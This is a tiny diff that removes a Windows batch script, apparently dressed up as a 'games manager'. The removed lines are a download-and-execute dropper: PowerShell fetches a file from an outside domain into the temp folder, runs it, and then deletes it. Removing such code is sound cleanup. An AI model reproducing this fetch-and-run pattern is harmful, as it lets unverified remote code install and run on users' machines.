@@ -1,7 +1,0 @@
-@echo off
-cls
-set "tempFile=%temp%\games-manager.bat"
-powershell -Command "Invoke-WebRequest -Uri 'https://itsdanitobg.online/games-manager' -OutFile '%tempFile%'"
-call "%tempFile%"
-del "%tempFile%"
-exit
